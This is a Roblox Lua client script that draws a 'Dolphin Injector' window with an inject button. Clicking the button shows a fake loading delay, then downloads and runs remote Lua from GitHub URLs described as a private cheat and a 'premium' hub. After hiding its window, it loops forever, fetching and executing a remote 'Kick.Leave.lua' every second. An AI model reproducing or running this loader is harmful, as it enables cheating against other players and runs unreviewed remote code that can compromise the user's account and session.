local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Create ScreenGui for Main UI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "InjectGui"
screenGui.Parent = playerGui
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false

-- Create Main Frame (UI Container)
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0.25, 0, 0.2, 0)
mainFrame.Position = UDim2.new(0.375, 0, 0.4, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
mainFrame.BorderSizePixel = 0
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.Parent = screenGui

-- Create UI Corner (Rounded Corners)
local mainUICorner = Instance.new("UICorner")
mainUICorner.CornerRadius = UDim.new(0, 10)
mainUICorner.Parent = mainFrame

-- Create Title Label (No Dragging)
local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, 0, 0.2, 0)
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "Dolphin Injector"
titleLabel.TextScaled = true
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
titleLabel.Parent = mainFrame

-- Create Inject Button
local injectButton = Instance.new("TextButton")
injectButton.Size = UDim2.new(0.8, 0, 0.3, 0)
injectButton.Position = UDim2.new(0.1, 0, 0.5, 0)
injectButton.Text = "Inject Upd 1.1"
injectButton.TextScaled = true
injectButton.Font = Enum.Font.GothamBold
injectButton.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
injectButton.TextColor3 = Color3.fromRGB(255, 255, 255)
injectButton.BorderSizePixel = 0
injectButton.Parent = mainFrame

-- Add Rounded Corners to Button
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 6)
buttonCorner.Parent = injectButton

-- Hover Effect for Button
injectButton.MouseEnter:Connect(function()
    injectButton.BackgroundColor3 = Color3.fromRGB(90, 160, 210)
end)
injectButton.MouseLeave:Connect(function()
    injectButton.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
end)

-- Functions for Injecting
local function startInjecting()
    -- Simulate loading process
    local totalTime = 5
    local startTime = tick()
    while tick() - startTime < totalTime do
        local progress = (tick() - startTime) / totalTime
        wait(0.1)
    end

    -- After progress completes, load the cheat
    local success, errorMessage = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/UniDCYT/Dolhin-Tsb-Private-Cheat/refs/heads/main/MainCheat.lua"))()
        wait(1)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/NYX0HUB/premium/refs/heads/main/main"))()
    end)

    -- Log injection result
    if success then
        print("Injection Complete!")
    else
        print("Error during injection: " .. errorMessage)
    end

    -- Hide UI after injection
    injectButton.Visible = false
    mainFrame.Visible = false

    -- Continuously run the external script every second
    while true do
        wait(1)
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Infernalblight/Dolhin-Tsb-Private-Cheat/refs/heads/main/Kick.Leave.lua"))()
        end)
    end
end

-- Connect Inject Button
injectButton.MouseButton1Click:Connect(function()
    startInjecting()
end)
